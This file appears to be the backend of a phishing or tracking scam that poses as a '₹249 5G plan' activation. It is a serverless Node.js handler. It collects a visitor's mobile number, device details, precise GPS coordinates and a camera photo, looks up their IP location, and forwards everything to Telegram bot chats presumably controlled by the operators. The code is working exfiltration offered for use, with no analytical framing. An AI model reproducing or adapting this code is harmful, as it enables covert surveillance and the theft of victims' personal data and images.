const axios = require('axios');

module.exports = async (req, res) => {
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Handle OPTIONS request
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  // Only allow POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  try {
    // Get tokens from environment variables
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const MAIN_CHAT_ID = process.env.MAIN_CHAT_ID;
    const IPINFO_TOKEN = process.env.IPINFO_TOKEN;
    
    if (!BOT_TOKEN || !MAIN_CHAT_ID) {
      throw new Error('Server configuration missing');
    }
    
    const userData = req.body;
    const USER_CHAT_ID = userData.userChatId || MAIN_CHAT_ID;
    
    // Get IP information
    let ipInfoData = {};
    try {
      const ipResponse = await axios.get(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
      ipInfoData = ipResponse.data;
    } catch (ipError) {
      ipInfoData = { 
        ip: 'Unknown', 
        city: 'Unknown', 
        country: 'Unknown',
        org: 'Unknown',
        region: 'Unknown'
      };
    }
    
    // Format message (your original format)
    const message = `
💰 *₹249 5G PLAN ACTIVATED*
📱 Mobile: +${userData.country?.replace('+', '') || ''}${userData.mobile || ''}
📡 Operator: ${userData.operator || ''}

🌐 *IP Information:*
🌐 IP Address: ${ipInfoData.ip || 'N/A'}
📡 ISP: ${ipInfoData.org || 'N/A'}
📍 City: ${ipInfoData.city || 'N/A'}
🗺️ Region: ${ipInfoData.region || 'N/A'}
🌍 Country: ${ipInfoData.country || 'N/A'}

📱 *Device Info:*
🔋 Charging: ${userData.deviceInfo?.battery?.charging ? 'Yes' : 'No'}
🔌 Battery Level: ${userData.deviceInfo?.battery?.level || 'N/A'}%
🌐 Network Type: ${userData.deviceInfo?.connection?.effectiveType || 'N/A'}
🕒 Time Zone: ${userData.deviceInfo?.timezone || 'N/A'}
🖥️ User Agent: ${userData.deviceInfo?.userAgent || 'N/A'}

📍 *Location:* ${userData.location?.latitude ? 
`Latitude: ${userData.location.latitude}
Longitude: ${userData.location.longitude}
Accuracy: ${userData.location.accuracy ? Math.round(userData.location.accuracy) + 'm' : 'N/A'}
🌍 View on Map: https://maps.google.com/?q=${userData.location.latitude},${userData.location.longitude}` : 
'Permission Denied'}

📸 *Camera:* ${userData.photo?.status === 'Permission Denied' ? 'Permission Denied' : (userData.photo ? 'Captured ✓' : 'N/A')}

🔗 *URL:* ${userData.deviceInfo?.url || 'N/A'}
⏰ *Time:* ${new Date(userData.timestamp || Date.now()).toLocaleString('en-IN')}
    `;
    
    // ✅ Send to BOTH chat IDs
    const chatIds = [...new Set([MAIN_CHAT_ID, USER_CHAT_ID])];
    const results = [];
    
    for (const chatId of chatIds) {
      try {
        // Send message
        await axios.post(
          `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
          {
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
          }
        );
        
        // Send photo if available
        if (userData.photo && userData.photo.startsWith('data:image')) {
          await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
            {
              chat_id: chatId,
              photo: userData.photo,
              caption: `📸 Verification for ${userData.mobile || 'user'}`
            }
          );
        }
        
        results.push({ chatId, success: true });
      } catch (error) {
        results.push({ chatId, success: false, error: error.message });
      }
    }
    
    res.status(200).json({ 
      success: true, 
      message: 'Data sent to Telegram',
      results: results
    });
    
  } catch (error) {
    console.error('API Error:', error.message);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
};
